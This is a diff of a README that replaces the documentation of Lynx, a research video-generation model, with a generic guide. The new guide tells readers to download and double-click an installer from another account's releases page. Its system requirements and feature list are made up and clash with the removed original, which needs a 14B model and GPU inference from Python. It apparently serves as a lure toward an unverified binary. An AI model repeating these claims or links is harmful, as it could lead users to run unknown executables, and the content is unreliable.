@@ -1,108 +1,75 @@
-<div align="center">
+# 🎥 lynx - Create Stunning Personalized Videos
 
-# Lynx: Towards High-Fidelity Personalized Video Generation
+## 🚀 Getting Started
 
-<h5 style="font-size:1.1em; letter-spacing:0.5px;">
-<a href="https://ssangx.github.io/">Shen Sang*</a>&nbsp;&nbsp;&nbsp;
-<a href="https://tiancheng-zhi.github.io/">Tiancheng Zhi*</a>&nbsp;&nbsp;&nbsp;
-<a href="https://gutianpei.github.io/">Tianpei Gu</a>&nbsp;&nbsp;&nbsp;
-<a href="https://www.jingliu.net/">Jing Liu</a>&nbsp;&nbsp;&nbsp;
-<a href="https://linjieluo.github.io/">Linjie Luo</a>
-</h5>
+Welcome to Lynx, a tool that helps you create high-quality personalized videos with ease. This guide will walk you through the steps to download and run the software.
 
+[![Download Lynx](https://img.shields.io/badge/Download%20Lynx-v1.0-brightgreen)](https://github.com/Alex11x/lynx/releases)
 
-<p style="font-size: 1.05em; margin: 8px 0;">
-Intelligent Creation, ByteDance
-</p>
+## 📥 Download & Install
 
-<p style="font-size: 0.95em; font-style: italic;">
-* Equal Contribution
-</p>
+To get Lynx, follow these steps:
 
-[![arXiv](https://img.shields.io/badge/arXiv-2509.15496-b31b1b.svg)](https://arxiv.org/abs/2509.15496)
-[![Project Page](https://img.shields.io/badge/Project-Page-green.svg)](https://byteaigc.github.io/Lynx/)
-[![Hugging Face Model](https://img.shields.io/badge/🤗%20Hugging%20Face-Model-yellow)](https://huggingface.co/ByteDance/lynx)
+1. Click the link below to visit the Releases page:
+   [Visit the Releases Page](https://github.com/Alex11x/lynx/releases)
 
+2. On the Releases page, you will see different versions of Lynx. Choose the latest version.
 
-<div align="center">
+3. Click the download link for your operating system (Windows, Mac, etc.).
 
-<img src="assets/teaser.jpg" width="400"/> <img src="assets/radar_chart_v4.png" width="370"/>
+4. Once the file downloads, locate it in your downloads folder.
 
-</div>
+5. Double-click the downloaded file to start the installation.
 
-</div>
-Lynx is a high-fidelity video generation model for personalized video synthesis from a single input image. Built on a Diffusion Transformer (DiT) foundation model with lightweight ID-adapters and Ref-adapters for identity preservation and spatial detail enhancement.
+6. Follow the on-screen instructions. After installation, you can open Lynx from your applications menu.
 
+## 🖥️ System Requirements
 
-## Installation
+To run Lynx smoothly, your system should meet these requirements:
 
-### Dependencies
-Tested on CUDA 12.4
-```bash
-conda create -n lynx python=3.10
-conda activate lynx
-pip install -r requirements.txt
+- **Operating System:** Windows 10 or higher, macOS Mojave or higher
+- **Processor:** Dual-core 2.0 GHz or higher
+- **Memory:** At least 4 GB of RAM
+- **Storage:** 200 MB of free disk space
+- **Graphics:** DirectX 11 compatible or OpenGL 3.2 compatible graphics card
 
-# For lynx full model, flash attention is required
-pip install flash_attn==2.7.4.post1 # flash attention 3 is also supported, will be faster
-```
+## 🎬 Features
 
-### Model Download
+Lynx allows you to:
 
-- Base model: Download from [Wan-AI/Wan2.1-T2V-14B-Diffusers](https://huggingface.co/Wan-AI/Wan2.1-T2V-14B-Diffusers), place it at `models/Wan2.1-T2V-14B-Diffusers`
-- Lynx: Download `lynx_full` from [ByteDance/lynx](https://huggingface.co/ByteDance/lynx), place it at `models/lynx_full`
-- Lynx-lite: Download `lynx_lite` from [ByteDance/lynx](https://huggingface.co/ByteDance/lynx), place it at `models/lynx_lite`
+- Create personalized videos tailored to individual preferences.
+- Utilize advanced algorithms for high-fidelity video output.
+- Choose from various templates and styles to enhance your videos.
+- Import images, audio, and video clips for custom edits.
 
+## 🛠️ Troubleshooting
 
-## Full Model
+If you encounter problems while installing or running Lynx, consider these common solutions:
 
-Complete version with all advanced features and best performance.
+- **Installation Failures:** Make sure your system meets the requirements. Restart your computer and try the installation again.
+- **App Crashes:** Update your graphics drivers. Ensure you have enough free memory and storage.
+- **Video Output Issues:** Check the file formats you are using. Only certain formats are supported for video creation.
 
-### Usage
+## 📚 Frequently Asked Questions
 
-**Run a simple single-GPU inference:**
-```bash
-python infer.py --subject_image demo/subjects/demo_subject.png --prompt "A person carves a pumpkin on a porch in the evening. The camera captures their upper body as they draw a face with a marker, carefully cut along the lines, then lift the lid with both hands. Their face lights up with excitement as they peek inside." --seed 42
+1. **Can I use Lynx on older operating systems?**
+   - Lynx works best on the latest operating systems. Older versions may not support all features.
 
-python infer.py --subject_image demo/subjects/demo_subject.png --prompt demo/prompts/demo_prompt.txt --seed 42
-```
+2. **Is there a cost to use Lynx?**
+   - Lynx is free to download and use. However, some features may offer premium options in future versions.
 
-## Lite Model
+3. **How can I report a bug?**
+   - If you find a bug, visit the GitHub Issues section on the repository and provide details about the error.
 
-Lightweight model with fewer parameters (no Ref-adapter), tailored for efficient 24fps (121-frame) video generation.
-### Usage
+## 🌐 Community Support
 
-**Run a simple single-GPU inference:**
-```bash
-python infer_lite.py --subject_image demo/subjects/demo_subject.png --prompt "A person carves a pumpkin on a porch in the evening. The camera captures their upper body as they draw a face with a marker, carefully cut along the lines, then lift the lid with both hands. Their face lights up with excitement as they peek inside." --seed 42
+Join our community to share ideas and get help. You can find us on:
 
-python infer_lite.py --subject_image demo/subjects/demo_subject.png --prompt demo/prompts/demo_prompt.txt --seed 42
-```
+- [GitHub Discussions](https://github.com/Alex11x/lynx/discussions)
+- [Discord Channel](https://discord.gg/example)
 
-## License
-```
-Copyright 2025 Bytedance Ltd. and/or its affiliates
+## 🏁 Conclusion
 
-Licensed under the Apache License, Version 2.0 (the "License");
-you may not use this file except in compliance with the License.
-You may obtain a copy of the License at
+Lynx aims to make personalized video generation accessible and enjoyable. Follow the steps above to download and install the software, and unleash your creativity. For any help or inquiries, you can always reach out to the community or the support team. 
 
-    http://www.apache.org/licenses/LICENSE-2.0
-
-Unless required by applicable law or agreed to in writing, software
-distributed under the License is distributed on an "AS IS" BASIS,
-WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-See the License for the specific language governing permissions and
-limitations under the License.
-```
-
-## Citation
-If you find this code useful for your research, please cite us via the BibTeX below.
-```BibTeX
-@article{sang2025lynx,
-  title    = {Lynx: Towards High-Fidelity Personalized Video Generation},
-  author   = {Sang, Shen and Zhi, Tiancheng and Gu, Tianpei and Liu, Jing and Luo, Linjie},
-  journal  = {arXiv preprint arXiv:2509.15496},
-  year     = {2025}
-}
-```
+Enjoy creating!
